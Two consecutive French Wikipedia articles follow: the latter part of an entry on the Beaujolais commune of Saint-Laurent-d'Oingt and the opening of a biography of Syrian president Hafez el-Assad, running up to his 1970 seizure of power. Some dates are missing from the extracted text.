La zone dans laquelle se trouve Saint-Laurent-d'Oingt présente un intérêt géologique (avec notamment le gisement fossilifère et le gîte de Valtorte, et à proximité immédiate les circuits géologiques de « Pierres Folles », tous cités à l’inventaire des sites géologiques remarquables de la région Rhône-Alpes). Le territoire de Saint-Laurent-d’Oingt repose sur les assises primitives et les dépôts sédimentaires. À l’ouest, la terre est légère et siliceuse. À l’est, elle provient de l’effritement des assises du jurassique inférieur ; elle est siliceuse, silico-argileuse et silico-calcaire. La partie située à l’ouest contient des doses très moyennes d’azote et d’acide phosphorique. Elle est pauvre en calcaire et contient assez de potasse. À l’est, le sol renferme des doses suffisantes de potasse. L’acide phosphorique et la chaux sont représentés par des chiffres plus élevés à l’ouest.
Écologie.
Saint-Laurent-d’Oingt fait partie d’une zone naturelle d'intérêt écologique, faunistique et floristique (ZNIEFF) de type II, qui délimite le haut bassin versant de l’Azergues et du Soanan. Les cours d’eau proprement-dits sont identifiés en ZNIEFF de type I (en raison de la présence de populations remarquables d’écrevisse à pattes blanches), de même que d’autres secteurs de grand intérêt biologique, notamment l’une des deux seules tourbières connues du département du Rhône et des gîtes à chauves-souris.
Classée en piscicole sur les deux-tiers amont de son cours, l’Azergues traverse Saint-Laurent-d'Oingt dans la vallée. Elle est la principale rivière à truite du département du Rhône. Plusieurs groupements piscicoles sont identifiables dans l'Azergues des sources à la Saône. De l'amont vers l'aval on trouve ainsi la zone à Truite, la zone à Ombre (dont fait partie Saint-Laurent-d'Oingt), la zone à Barbeau et la zone à Brème. Divers poissons, dont certains sont en voie de disparition, vivent dans l'Azergues et ses affluents. Dans l’Aze et l’Ergues (les deux bras en amont de l’Azergues), l’Azergues jusqu'en aval de Lamure, le Soanan de sa source à la confluence du ruisseau de Dième, l’ensemble de leurs ruisseaux affluents, on trouve la truite et ses espèces d'accompagnement : chabot, lamproie de Planer, loche franche et vairon.
Histoire.
Premières occupations humaines.
Dans la période préhistorique, toute cette région était occupée : à quelques kilomètres de Saint-Laurent-d'Oingt, au Breuil sur les bords de l'Azergues, à en aval, on découvrit au toute une station préhistorique. À Saint-Laurent-d'Oingt, des découvertes permettent d'attester le passage dans les mêmes lieux, à une époque très antérieure, d’hommes utilisant des outils en silex taillé, ainsi que des nucléus, des lames, des racloirs et même une pointe de flèche, de l’époque de l’âge du cuivre (Chalcolithique environ moins 2 000 ans av. J.-C.).
Longtemps, aucune trace d'occupation pendant la période romaine ne fut attestée, tant au niveau archéologique que bibliographique. Le sommet abrupt de cette montagne avait pourtant dû inciter les Romains à s'y établir pour protéger "l'Iter Magnum", voie militaire reliant Feurs à Anse et passant par Oingt (suivant le tracé actuel de la route départementale No. 96), traversant le hameau ou mâs de l’Oyasson, pour rejoindre le prieuré, d'où elle descendait vers la Saône. Cette voie était encore fréquentée au Moyen Âge.
Des prospections récentes ont permis d’identifier trois sites, qui ont ensemble des points communs: la présence de "tegulae" qui atteste d’un bâti « à la romaine » sur les trois sites (couverture en tuiles de bâtiments en bois et pisé sur solin de pierre); chaque habitat possédait une meule en pierre de lave pour moudre le grain; chaque site a livré une quantité importante de tessons de céramique commune grise (ustensiles de cuisson : pot et marmite) et de céramique commune rouge (transport, stockage et transformation des aliments : amphore, pichet, pot, plat, etc.).
Les trois sites ont aussi livré leur lot de vaisselle de table en céramique fine (sigillée et luisante) et en verre. Des ateliers de production ont été identifiés : Lezoux (Puy-de-Dôme), Portout (Savoie), Val de Saône (Rhône). Les matériaux trouvés sur un des sites semblent ceux d’une villa cossue, occupée (peut-être de façon discontinue) entre le et le , mais des tessons datables du sont présents en petit nombre sur le site, laissant penser à une implantation plus précoce.
Moyen Âge.
À l'origine couvertes de bois et de forêts, les terres de Saint-Laurent-d'Oingt appartenaient à Gaucerand de Sémur (aussi appelé Gaucerannus Libretz), dont le père, Fredeland de Semur, et son épouse Richarde, donnèrent le août 1000 à l'abbaye de Savigny l'église de Saint-Laurent. L'abbaye y établit un prieuré, et le premier acte concernant Saint-Laurent-d'Oingt se trouve dans un terrier de l'abbaye de Savigny relatant cette donation. Saint-Laurent-d'Oingt est mentionné dans le cartulaire de l'abbaye sous la forme "Sanctus Laurentius de Iconio". 
Il n'y eut d'abord qu'un célérier dans l'abbaye de Savigny ; mais on fut obligé de diviser sa charge de bonne heure: le nom de Saint-Laurent, qu'on donnait au petit célérier, vient de ce qu'on unit à cet office le prieuré de Saint-Laurent-d'Oingt. Le grand prieur de Savigny était en même temps prieur et cellérier de Saint-Laurent-d'Oingt et nommait à la cure. Les bénédictins défrichèrent les terres et les concédèrent à ses premiers habitants moyennant une dîme. 
Dalmas succéda à Gaucerand dans la baronnie de Sémur et la seigneurie de Saint-Laurent, et confirma le don qui avait été fait. La seigneurie se trouvant aux confins du Lyonnais et du Beaujolais était isolée et mal fréquentée. Damas pria Guichard le Vieux, Seigneur d'Oingt ("Senior de Iconio"), fils d'Umfred d'Oingt, de protéger l'abbaye de Savigny contre les tentatives de spoliateurs. Son fils, Falque (Falco) d'Oingt, protégea aussi l'abbaye de Savigny. Cet exemple ne fut pas suivi par Robert d'Oingt dont une charte de 1128 nous apprend qu'il renonça toutefois à ses prétentions sur les prières de l'abbé, et qu'il s'engagea pour lui et ses successeurs à respecter les possessions de l'abbaye. 
Le Grand Célérier de Savigny avait l'obligation de donner aux lépreux cinq œufs tous les mercredis, vendredis et samedis du 17 décembre au 23 juin, obligation à laquelle était aussi soumis à son tour le Célérier de Saint-Laurent du 23 juin au 17 décembre. On trouve dans les archives de Savigny mention d'un célérier de Saint-Laurent, Étienne Grollier, qui avait si bien mérité de son ordre qu'il fut établi après sa mort que l'on irait jeter de l'eau bénite sur sa tombe et y réciter des prières après la grand-messe hebdomadaire (ce qui se faisait encore en 1757). Le prieuré disparu dès le commencement du , mais subsista comme bénéfice.
Le Lyonnais, terre d’empire, fut annexé au royaume de France en 1314. Le Beaujolais allié de la France, ne devint français qu’à la fin du . Oingt, Sainte-Paule et Saint-Laurent d'Oingt, mais aussi Ville-sur-Jarnioux se trouvaient à la frontière en Lyonnais. Un extrait des registres de la cour des aides fait état d'un différend entre les habitants de Saint-Laurent d'Oingt et ceux du Bois-d'Oingt et Légny en 1517.
Le fief de la Forest, dont le château contrôlait la vallée du Fourcon conduisant à Oingt et était alimenté en farine par le moulin Chabost (ou "des planches de Chabost") sur la rivière de l'Azergues, existait dès le . Outre le moulin Chabost, les dépendances incluaient aussi la ferme de la Rabillière, les Molières, et le domaine de la Jaïetière (Gennetière).
En 1482, Guillaume Romain, seigneur de la Forest à Saint-Laurent-d'Oingt, établit une chapelle en l'honneur de Saint-Michel dans l'église du Bois-d'Oingt. Il est possible que le fief de la Forest lui ait été concédé en lien avec la donation, quelques années auparavant, en 1476, du fief du Bois-d'Oingt par Jean II de Bourbon à son frère, Pierre de Bourbon, fils naturel de Charles , duc de Bourbon.
Époque moderne.
Avant la Révolution française, "Sainct Laurens d’Oingt" était un village et paroisse dans la province du Lyonnais. La paroisse, avant 1789, englobait celle de Sainte-Paule et de Moiré (qui devinrent communes à part entière en 1791, lors de la création des communes). 
Le hameau Dalbepierre tient son nom de la famille d’Albepierre, qui parait être originaire de Ternand, où elle existait au , et était présente à Oingt en 1581. 
André Romain, ayant été anobli en juin 1522, était seigneur de la Forest en 1531. Il eut des démêlés avec les habitants du Bois-d'Oingt qui n'acceptèrent que difficilement, et seulement après moult procès, qu'ayant été récemment anobli, il ne fut pas soumis à la taille. Son fils Pierre lui succéda, suivi en 1574, par un autre fils noble Antoine Romain. Antoine Romain épousa le 27 septembre 1552 Étiennette du Rousset (alias de Rosset), fille de Jean du Rousset (ou de "Rosset"), seigneur d'Amareins, dont naquirent trois filles, qui devinrent toutes les trois religieuses.
Par le biais des successions et remariages, la Forest passa d'Étiennette du Rousset au "Bastard" Pompée de la Balme, fils naturel de Jean Louis de la Balme, puis à Philiberte de Ronchevol. Philiberte de Ronchevol s'étant remariée avec Prosper de Bachod, ces derniers vendirent la Forest le 9 mai 1608 à Benoît de Pomey, qui en fit hommage, le 19 décembre suivant, à la vicomtesse et baronne d'Oingt. 
Benoît de Pomey laissa la Forest à son neveu Hugues de Pomey, prévôt des marchands de Lyon, qui la légua à son cousin et filleul, autre Hugues de Pomey. Le 10 novembre 1699, Hugues de Pomey vendit le fief et maison forte, domaines et dépendances, de la Forest à Claude Desportes, bourgeois de Lyon.
Tout près du fief de la Forest se trouve la petite terre de Vacheron, qui fut le patrimoine d’Étienne de Vacheron (+1616), l’un des 120 chevaucheurs de la grande écurie du roi, ou courriers du roi. Étienne de Vacheron avait épousé Bénigne Olifant (+1616) fille de Jean Olifant (1555-1596/1601). Les Vacherons étaient alliés aux Olifants de Prosny, alliés eux-mêmes aux Bourbons par le mariage de Pierre d’Olifant contracté en 1492 avec une petite-fille de Charles de Bourbon, comte d’Auvergne.
Jusqu'à la date du 5 mars 1710, la paroisse de Saint-Laurent-d'Oingt eût deux seigneurs : le baron, vicomte d'Oingt ; et l'abbaye de Savigny. Par acte du 5 mars 1710, la portion du territoire relevant de la vicomté d'Oingt changea de seigneur, Charles François de Chateauneuf de Rochebonne, vicomte d'Oingt, vendant à Charles Cachot, écuyer, seigneur de Combefort (au Bois d'Oingt) et de Courbeville (à Chessy) la Justice Haute, Moyenne et Basse de la paroisse de Saint-Laurent-d'Oingt. 
Charles Cachot, alors seigneur de Saint-Laurent, vendit le fief de Combefort et tous les droits sur la paroisse de Saint-Laurent-d'Oingt à Jean Gervais, bourgeois non anobli vers 1720. Demoiselle Louise Gervais devint 'Dame de Saint-Laurent' par adjudication du fief de Combefort et dépendances le 5 mai 1733. À la fin du , la maison-fort de Combefort, situé à l'extrémité occidentale de la paroisse, était le chef-lieu de la seigneurie.
Époque contemporaine.
Pendant la Révolution française, les bâtiments de l'ancien prieuré et les terres qui en dépendaient furent vendus comme biens nationaux. Durant une courte période, Saint-Laurent-d'Oingt s'appela "Laurent-d'Azergues", puis Brancillon. En effet, une délibération du Département du Rhône en date du 11 frimaire an II disposa que « les conseils généraux des communes dont le nom est celui d’un saint [...] s’assembleront sans délai pour changer ces noms en d’autres qui seront conformes à la Révolution ». À partir de 1790, la commune de Saint-Laurent-d'Oingt fut incluse dans le département du Rhône-et-Loire, dans le canton de Villefranche-sur-Saône. 
On trouve mention de personnes originaires du village qui furent victimes de la révolution: Claude Danguin, cabaretier né à Saint-Laurent-d'Oingt et résidant à Lyon fut condamné par la Commission révolutionnaire de Lyon et fusillé (à l'âge de 42 ans) le 13 décembre 1793, avec pour motif d'accusation : « Caporal et contre-révolutionnaire »; Claude Magny, domestique né à Saint-Laurent-d'Oingt, et résidant à Lyon, fut condamné par la Commission révolutionnaire de Lyon et guillotiné (à l'âge de 44 ans) le 29 décembre 1793, avec pour motif d'accusation : « Grenadier, pris à la sortie les armes à la main ».
La famille Desportes, seigneurs de la Forest, fournit un maire à la commune de Saint-Laurent-d'Oingt, en la personne de Claude Étienne Toussaint Desportes, de 1815 à 1830.
Un roman historique de Jean Reby-Fayard, "Pierrette, des Vignes aux Tranchées", relate la participation des habitants de Saint-Laurent-d'Oingt et des villages voisins - et le lourd tribut payé par eux - au premier conflit mondial.
Politique et administration.
En juillet 2016, les municipalités d'Oingt, du Bois-d'Oingt et de Saint-Laurent-d'Oingt votent un regroupement en une seule commune portant le nom de Val d'Oingt.
Démographie.
La population était supérieure à 700 habitants depuis le début du recensement (1793) et durant tout le , à l'exception de l'année 1800 (580 , repère A). Elle baissa pour la première fois en dessous de ce seuil à la suite de la Première Guerre mondiale (597 , repère B). Elle décrut ensuite assez régulièrement à chaque recensement jusqu'en 1962, repère C (exode rural?), pour n'augmenter qu'à partir du recensement de 1968. La croissance du village s'est accélérée dans les années 1980 (repère D), mais n'a jamais retrouvé son niveau de 1806 (882 habitants).
Économie.
Quelques équipements de base (poste, épicerie) permettent un commerce de proximité. Les éditions Mnémos ont leur siège social à Saint-Laurent-d'Oingt.
Agriculture.
Vers 1900, la surface cultivée de Saint-Laurent-d’Oingt s’étendait sur 837 hectares. La vigne couvrait l’essentiel de la commune (602 hectares). Le vin produit sur la partie granitique était réputé tendre et agréable à boire, tandis que celui récolté à l’est plus corsé et de longue garde.
On y cultivait aussi : le froment (58 hectares) le seigle (2 hectares), l’avoine (4 hectares), les pommes de terre (2 hectares), les betteraves fourragères (2 hectares), le trèfle et la luzerne (25 hectares), le colza (2 hectares). Le reste était constitué de prairies naturelles, irriguées et non-irriguées (114 hectares) de jardins (3 hectares), bois (18 hectares) et vassibles (15 hectares).
La vigne occupe aujourd'hui 360 hectares, une quarantaine d'exploitants produit le vin AOC Beaujolais, soit en cave particulière soit à la cave Beaujolaise dont la situation lui vaut le titre de « Belvédère des Pierres Dorées ». Le week-end suivant le troisième jeudi de novembre, a lieu l'opération « portes ouvertes », pour la dégustation du « Beaujolais nouveau ».
Tourisme.
Plusieurs gîtes ruraux et chambres d'hôtes, gérés par des habitants de Saint-Laurent-d'Oingt, contribuent au dynamisme de l'économie locale.
Équipements et services.
Transports.
Plusieurs lignes ferroviaires en direction de Lyon ou Lozanne desservent les gares voisines de Ternand et de Bois-d'Oingt - Légny.
Enseignement.
La commune fait partie de l'académie de Lyon.
Une nouvelle école écologique (avec géothermie), construite en 2010, accueille trois classes. Elle est équipée d'une salle de motricité et d'une salle informatique. Une cantine permet l'accueil des enfants le midi. 
Le collège se situe sur la commune du Bois-d'Oingt. Les lycées sont à Villefranche-sur-Saône, Tarare ou L'Arbresle. Le Centre d'information et d'orientation (CIO) est à Villefranche.
Sports et loisirs.
La commune est équipée d'un stade et d'un terrain de pétanque, ainsi que d'une bibliothèque et d'une salle des fêtes.
Différentes activités sont possibles localement.
Santé.
On trouve une pharmacie et plusieurs médecins au village voisin du Bois d'Oingt. Un centre Soins de Santé et Réadaptation(SSR) et une clinique vétérinaire sont également présents sur cette commune.
Vie locale.
Cultes.
Le culte catholique est pratiqué à l'église. La messe y est célébrée à 9 h le des mois impairs. Tous les dimanches et fêtes la messe est célébrée à 10 h 30 au Bois d’Oingt. 
Autrefois une paroisse à part entière, Saint-Laurent-d'Oingt fait aujourd'hui partie de la paroisse Saint-Vincent des Pierres dorées, laquelle réunit 19 communes du Beaujolais correspondant au canton du Bois d’Oingt plus Alix. 
L'église de Saint-Laurent-d'Oingt, qui fut à une époque la chapelle du prieuré de Saint-Laurent, peut accueillir environ 250 personnes. L'accès n'est pas aménagé pour les personnes handicapées.
Environnement.
La collecte des déchets est réalisée par l'intercommunalité. Celle-ci a par ailleurs équipé la commune d'une déchèterie intercommunale.
Le syndicat d'assainissement du Val d'Azergues participe à l'assainissement communal (pose d'un collecteur de Saint-Laurent à Chamelet, de 2010 à 2012).
Culture locale et patrimoine.
Espaces verts et fleurissement.
En 2014, la commune de Saint-Laurent-d'Oingt bénéficie du label « ville fleurie » avec « deux fleurs » attribuées par le Conseil national des villes et villages fleuris de France au concours des villes et villages fleuris.

</doc>
<doc id="248858" url="https://fr.wikipedia.org/wiki?curid=248858" title="Hafez el-Assad">
Hafez el-Assad

Hafez el-Assad (en / "Ḥāfiẓ al-Asad"), né le à Qardaha et mort le à Damas, est un militaire et homme d'État syrien, président de la République arabe syrienne de 1971 à 2000.
Il a été Premier ministre de Syrie de 1970 à 1971, ainsi que secrétaire régional du commandement régional de la branche régionale syrienne du parti Baas et secrétaire général du commandement national du parti Baas de 1970 à 2000. Hafez el-Assad a été un participant clé au coup d'État syrien de 1963 qui a porté au pouvoir la branche régionale syrienne du parti Baas.
Les nouveaux dirigeants ont nommé Assad commandant de l'armée de l'air syrienne. En février 1966, Assad participe à un deuxième coup d'État qui renverse les dirigeants traditionnels du parti Baas. Assad a été nommé ministre de la Défense par le nouveau gouvernement. Quatre ans plus tard, Assad lance un troisième coup d’État qui renverse le leader de facto Salah Jedid et se désigne lui-même comme dirigeant de la Syrie.
Il a subordonné le socialisme d'État à un modèle économique mixte et défendu la propriété privée. Assad a également abandonné la rhétorique de l'exportation de la « révolution socialiste arabe » en renforçant les relations extérieures de la Syrie avec des pays que son prédécesseur, Salah Jedid, avait jugés réactionnaires. Bien qu'anticommuniste, Assad s'est rangé du côté de l'Union soviétique et du bloc de l'Est pendant la Guerre froide en échange d'un soutien contre Israël et, bien qu'il ait abandonné le concept panarabe d'unification du monde arabe en une seule nation arabe, il a cherché à dépeindre la Syrie comme le défenseur des Palestiniens contre Israël. Dans les années 1980, en conflit avec l'OLP, il soutient des groupes palestiniens dissidents laïques et nationalistes extrémistes et voit de nombreux chrétiens libanais se rallier au camp syrien au fil des années pendant la guerre du Liban.
Assad a ordonné une incursion militaire au Liban en 1976, qui a abouti à l'occupation syrienne du Liban. Durant son règne, Assad a écrasé un soulèvement islamiste mené par les rebelles des Frères musulmans syriens à la suite d'une série d'attentats et d'assassinats sur plusieurs officiers alaouites et une tentative d'assassiner Assad, provoquant une répression grâce à une série de mesures répressives culminant avec le massacre de Hama.
Après avoir consolidé son autorité personnelle sur le gouvernement syrien, Assad commença à chercher un successeur. Son premier choix fut son frère Rifaat, mais Rifaat tenta de prendre le pouvoir en 1983-1984 alors que la santé de Hafez était incertaine. Rifaat fut ensuite exilé lorsque la santé de Hafez se rétablit. Le choix suivant d'Hafez fut son fils aîné, Bassel el-Assad. Cependant, Bassel décéda dans un accident de voiture en 1994 et Hafez se tourna alors vers son plus jeune fils Bachar el-Assad, qui à cette époque n’avait aucune expérience politique. La décision de nommer un membre de sa propre famille comme successeur fut critiquée dans certains milieux de la classe dirigeante syrienne, mais Assad persista dans son plan et rétrograda les responsables qui s’opposaient à cette succession. En 2000, Hafez décède et c'est donc Bachar qui lui succède à la présidence jusqu'en 2024, année de la chute du régime Assad après une sanglante guerre civile débutée en 2011.
Son régime, structuré autour du parti unique du Baas, s'avère fortement autoritaire avec un étroit et profond contrôle de l'ensemble de la vie politique syrienne. Ceci confère une stabilité à un pouvoir politique syrien marqué jusque-là par les coups d'État et fait de la Syrie un acteur incontournable du Moyen-Orient pendant la guerre froide arabe.
Biographie.
Origines.
Le grand-père de Hafez s'est opposé au mandat français en Syrie et s'est également forgé une réputation dangereuse en matant les petits paysans locaux et débuts de jacquerie. Les autochtones l'appelaient d'abord "Wahhich", soit « brutal » ou « bête sauvage », puis "el-Assad", « le lion » en arabe. Son fils Ali al-Assad adopte définitivement ce nom en 1927. Dans une lettre adressée en 1936 à Léon Blum et aux dirigeants de la SFIO, Sleiman Ali el-Assad et d'autres notables alaouites se démarquent des musulmans sunnites, dénonçant même leur « fanatisme » contre les Juifs de Palestine « qui sont venus apporter à ces Arabes Musulmans la civilisation et la paix ». L'authenticité de cette lettre est contestée par l'historien .
Jeunesse.
Hafez el-Assad est né à Qardaha dans l'ouest de la Syrie au sein d'une famille appartenant à la communauté religieuse minoritaire des Alaouites, proche du chiisme. Il est le premier membre de sa famille à aller au lycée. Il milite au sein du parti Baas dès l'âge de 16 ans, en 1946. Les Alaouites se sont initialement opposés à un État syrien uni (car ils pensaient que leur statut de minorité religieuse les mettrait en danger) et le père de Hafez partageait cette conviction. Hafez a quitté son village alaouite et a commencé ses études à l'âge de neuf ans dans une région dominée par les sunnites de Lattaquié.
Il est devenu le premier de sa famille à fréquenter l'école secondaire, mais à Lattaquié, Assad a été confronté aux préjugés anti-alaouites de la part des sunnites. Il était un excellent élève, remportant plusieurs prix vers l'âge de 14 ans. Pour s'intégrer, il s'est rapproché des partis politiques qui ont accueilli les Alaouites. Ces partis (qui ont également embrassé la laïcité) étaient le Parti communiste syrien, le Parti social nationaliste syrien (PSNS) et le Parti Baas arabe, Assad a rejoint le Baas en 1946. Certains de ses amis appartenaient au PSNS. Le parti Baas (Renaissance) épousait une idéologie nationaliste, panarabe et socialiste.
Assad s'est avéré un atout pour le parti, organisant des cellules étudiantes du Baas et transmettant le message du parti aux quartiers pauvres de Lattaquié et aux villages alaouites. Il s'est heurté à l'opposition des Frères musulmans, qui se sont alliés aux familles musulmanes riches et conservatrices. Le lycée d'Assad accueillait des étudiants issus de familles riches et pauvres, et Assad a été rejoint par de jeunes musulmans sunnites pauvres et anti-establishment du parti Baas dans des affrontements avec des étudiants issus de riches familles des Frères musulmans. Il s'est fait de nombreux amis sunnites, dont certains sont devenus plus tard ses alliés politiques.
Sa famille ne pouvant lui offrir une éducation universitaire, Assad s'inscrit à l'Académie militaire syrienne, où l'on bénéficie d'une scolarité gratuite. Il s'y révèle un élève brillant et est envoyé en formation complémentaire de pilote de chasse en Union soviétique au sein de l'Armée rouge pendant onze mois.
À l'Académie, Assad rencontre Moustapha Tlass qui devient, par la suite, son compagnon de lutte politique. Son ascension au sein de la hiérarchie militaire est rapide, faisant de lui une figure importante de celle-ci.
Hafez el-Assad s'oppose en 1958 à l'union entre l'Égypte et la Syrie qui crée la République arabe unie. Stationné au Caire, il travaille, en compagnie d'autres officiers, à mettre un terme à cette union. Quoique baassiste et favorable à l'idéal d'une union panarabe, il s'oppose à la domination du régime de Nasser au sein de la République arabe unie. Il est alors brièvement emprisonné par les autorités égyptiennes lors de la dissolution de la république unitaire en 1961 à la suite du coup d'État sécessionniste de 1961 en Syrie.
Dans l'incertitude qui suit la dissolution de l'union égypto-syrienne, une coalition de groupements politiques de gauche menée par le Baas prend le pouvoir. Assad est nommé chef d'état-major de l'armée de l'air en 1964. L'État est alors officiellement dirigé par Amine al-Hafez, d'obédience sunnite. En fait, à travers le parti Baas qu'ils contrôlent, il est dominé par un groupe de jeunes alaouites, dont Assad fait partie.
Carrière dans l'Armée de l'air syrienne.
Après avoir obtenu son diplôme d'études secondaires, Hafiz aspirait à devenir médecin, mais son père ne pouvait pas payer ses études à l' Université jésuite Saint-Joseph de Beyrouth. Au lieu de cela, en 1950, il décide de rejoindre les forces armées syriennes. Hafez est entré à l'Académie militaire de Homs, qui lui a offert de la nourriture, un logement et une allocation gratuits. Hafez a obtenu son diplôme en 1955, après quoi il a été nommé lieutenant dans l' armée de l'air syrienne. Après avoir obtenu son diplôme de l'école de pilotage, il a remporté le trophée du meilleur aviateur.
À l'Académie, Assad rencontre Moustapha Tlass qui devient, par la suite, son compagnon de lutte politique. Son ascension au sein de la hiérarchie militaire est rapide, faisant de lui une figure importante de celle-ci et peu de temps après a été affecté à la base aérienne de Mezze près de Damas. Il épousa Anissa Makhlouf en 1957, une parente éloignée de la puissante famille Makhlouf.
Avant le coup d'État de 1963 : 1958-1963.
Hafez ne se contentait pas d’une carrière militaire professionnelle, la considérant comme une porte d’entrée vers la politique. Après la création de la République arabe unie (RAU), le chef du parti Baas Michel Aflaq a été contraint par Nasser de dissoudre le parti. Au cours de l'existence de la RAU, le parti Baas a connu une crise dont plusieurs de ses membres, pour la plupart jeunes, ont imputé la responsabilité à Aflaq. Hafez el-Assad s'oppose en 1958 à l'union entre l'Égypte et la Syrie qui crée la République arabe unie. Stationné au Caire, il travaille, en compagnie d'autres officiers, à mettre un terme à cette union. Quoique baassiste et favorable à l'idéal d'une union panarabe, il s'oppose à la domination du régime de Nasser au sein de la République arabe unie. Il est alors brièvement emprisonné par les autorités égyptiennes lors de la dissolution de la république unitaire en 1961. Pour ressusciter la branche régionale syrienne du parti, Mohammad Umran, Salah Jedid, Hafez et d'autres ont créé le Comité militaire. En 1957-1958, Hafez accéda à une position dominante au sein du Comité militaire, ce qui atténua son transfert en Égypte. Après que la Syrie ait quitté la RAU en septembre 1961, Assad et d'autres officiers baasistes furent démis de leurs fonctions militaires par le nouveau gouvernement de Damas, et il reçut un poste de bureau mineur au ministère des Transports.
Dans l'incertitude qui suit la dissolution de l'union égypto-syrienne, une coalition de groupements politiques de gauche menée par le Baas prend le pouvoir. Assad est nommé chef d'état-major de l'armée de l'air en 1964. L'État est alors officiellement dirigé par Amine al-Hafez, d'obédience sunnite. En fait, à travers le parti Baas qu'ils contrôlent, il est dominé par un groupe de jeunes alaouites, dont Assad fait partie.
Premier règne du Parti Baas : 1963-1970.
Leadership aflaqite : 1963-1966.
Peu de temps après l'élection de Hafez au commandement régional, le Comité militaire lui a ordonné de renforcer la position du comité au sein de l'establishment militaire. Hafez a peut-être reçu la tâche la plus importante de toutes, puisque son objectif principal était de mettre fin au factionnalisme dans l'armée syrienne et d'en faire un monopole du Baas comme il l'a dit, il devait créer une « armée idéologique ».
Pour l'aider dans cette tâche, Hafez a recruté Zaki al-Arsouzi, qui indirectement (par l'intermédiaire de Wahib al-Ghanim) l'a inspiré à rejoindre le parti Baas quand il était jeune. Arsouzi a accompagné Hafez lors de visites de camps militaires, où Arsouzi a enseigné aux soldats la pensée baasiste. En remerciement pour son travail, Hafez a donné à Arsuzi une pension du gouvernement. Assad a poursuivi sa baasification de l'armée en nommant des officiers fidèles à des postes clés et en veillant à ce que « l'éducation politique des troupes ne soit pas négligée ». Il a démontré ses compétences en tant que planificateur de patients au cours de cette période. Comme l' a écrit Patrick Seale, la maîtrise du détail de Hafez « suggérait l'esprit d'un officier du renseignement ».
Lutte pour le pouvoir et coup d’État de 1966.
À la suite du coup d'État de 1963, lors du premier congrès régional (tenu le 5 septembre 1963), Hafez a été élu au commandement régional syrien (l'organe décisionnel le plus élevé de la branche régionale syrienne). Bien qu'il ne s'agisse pas d'un rôle de leadership, c'était la première apparition de Hafiz dans la politique nationale. Rétrospectivement, il dit s'être positionné « à gauche » au sein du commandement régional. Khalid al-Falhum, un Palestinien qui travaillera plus tard pour l'Organisation de libération de la Palestine (OLP), a rencontré Hafez en 1963, il a noté que Hafez était un fervent homme de gauche mais plutôt engagé dans le nationalisme arabe.
Lors de l'émeute de Hama en 1964 menée par les Frères musulmans, Hafez a voté pour réprimer violemment le soulèvement si nécessaire. La décision de réprimer l'émeute de Hama a conduit à un schisme au sein du Comité militaire entre Umran et Jedid. Jedid souhaitait un État à parti unique fort, semblable à ceux des pays d'Europe de l'est à l'époque. Hafez, en tant qu'associé junior, est resté silencieux au début mais s'est finalement allié à Jadid. La raison pour laquelle Hafez a choisi de se ranger à son côté a été largement discutée, il partageait probablement la vision idéologique radicale de Jadid. Ayant perdu pied au Comité militaire, Umran s'est aligné sur Aflaq et le commandement national, il leur a dit que le Comité militaire envisageait de prendre le pouvoir dans le parti en les évinçant. En raison de la défection d'Umran, Rifaat al-Assad (le frère de Hafez) a succédé à Umran en tant que commandant d'une force militaire secrète chargée de protéger les loyalistes du Comité militaire.
Dans sa tentative de prendre le pouvoir, le Comité militaire s'est allié aux régionalistes, un groupe de cellules de la branche régionale syrienne qui a refusé de se dissoudre en 1958 lorsqu'on lui a ordonné de le faire. Bien qu'Aflaq considérait ces cellules comme des traîtres, Hafez les appelait les « vraies cellules du parti » cela a encore une fois mis en évidence les différences entre le Comité militaire et le Commandement national dirigé par Aflaq. Lors du huitième congrès national en 1965, Hafez a été élu au commandement national, l'organe décisionnel le plus élevé du parti. Depuis sa position au sein du commandement national, Assad a informé Salah Jedid de ses activités. Après le congrès, le commandement national a dissous le commandement régional syrien ; Aflaq a proposé Salah Eddine Bitar comme Premier ministre, mais Hafez et Brahim Makhous se sont opposés à la nomination de Bitar. Selon Seale, Hafez abhorrait Aflaq, il le considérait comme un autocrate et un droitard, l'accusant d'avoir « abandonné » le parti en ordonnant la dissolution de la branche régionale syrienne en 1958. Hafez, qui n'aimait pas non plus les partisans d'Aflaq, s'est néanmoins opposé à une démonstration de force contre les Aflaqites. En réponse au coup d'État imminent, Hafez, Naji Jamel, Hussein Mulhim et Yusuf Sayigh sont partis pour Londres.
Lors du coup d'État syrien de 1966, le Comité militaire a renversé le commandement national. Le coup d'État a conduit à un schisme permanent au sein du mouvement Baassiste, à l'avènement du "néo-baasisme" et à la création de deux centres du mouvement baasiste international : l'un à domination irakienne et l'autre à domination syrienne.
Jedid en homme fort : 1966-1970.
Après le coup d’État, Hafez a été nommé ministre de la Défense. C'était son premier poste ministériel et, grâce à sa position, il serait propulsé à l'avant-garde du conflit syro-israélien. Salah Jedid était le leader incontesté à l'époque, choisissant de rester au poste de secrétaire régional adjoint du commandement régional syrien au lieu d'occuper le poste exécutif (qui était historiquement occupé par les sunnites). Nureddin al-Atassi s'est vu attribuer trois des quatre postes exécutifs les plus élevés du pays : président, secrétaire général du commandement national et secrétaire régional du commandement régional syrien. Le poste de Premier ministre a été confié à Yusuf Zu'ayyin. Jedid (qui établissait son autorité) s’est concentré sur les questions civiles et a donné à Hafiz le contrôle de facto de l’armée syrienne, le considérant comme une menace.
Après le discrédit de la défaite militaire de la guerre des Six Jours et l'intervention avortée de la Syrie dans le conflit jordano-palestinien de Septembre noir, pour lesquels Hafez el-Assad attribue la responsabilité des désastres à Jedid et Atassi, ces tensions se transforment en un conflit ouvert. Hafez el-Assad est en réalité déjà en train de comploter pour discréditer Atassi : il a interdit à l'aviation syrienne de décoller, avec pour résultat la destruction des blindés envoyés par Atassi en Syrie.
Quand le président Noureddine al-Atassi et le secrétaire général du parti Baas, Salah Jedid, prennent conscience du danger et ordonnent qu'Assad et Tlass soient écartés de toute position de pouvoir dans le parti et le gouvernement, il est déjà trop tard. Assad a déjà manœuvré, avec l'aide de son frère Rifaat, de ses réseaux d'influence alaouites et du chef d'État major Tlass.
Hafez el-Assad lance rapidement un coup de force à l'intérieur du parti qui est « purgé », et bien que le congrès se prononce en faveur d'Atassi et Jedid, tous deux sont envoyés en prison, avec des milliers de leurs partisans, tandis que les partisans d'Assad s'emparent de tous les postes clés de l'appareil d'État.
Président de la République.
Régime autoritaire.
